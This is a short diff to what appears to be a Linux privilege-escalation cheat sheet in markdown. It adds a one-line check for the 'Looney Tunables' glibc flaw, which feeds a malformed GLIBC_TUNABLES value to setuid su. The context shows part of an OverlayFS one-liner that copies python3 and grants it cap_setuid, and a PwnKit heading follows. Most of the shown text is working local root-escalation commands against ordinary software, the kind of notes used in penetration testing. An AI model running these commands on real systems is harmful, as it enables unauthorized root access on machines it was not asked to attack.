@@ -137,9 +137,10 @@ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/pyt
 ```
 
 Check for looney tunables
-----
 #priv-esc-linux
-
+```bash
+env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
+```
 
 PwnKit (by the author of 'certipy'):
 ```bash
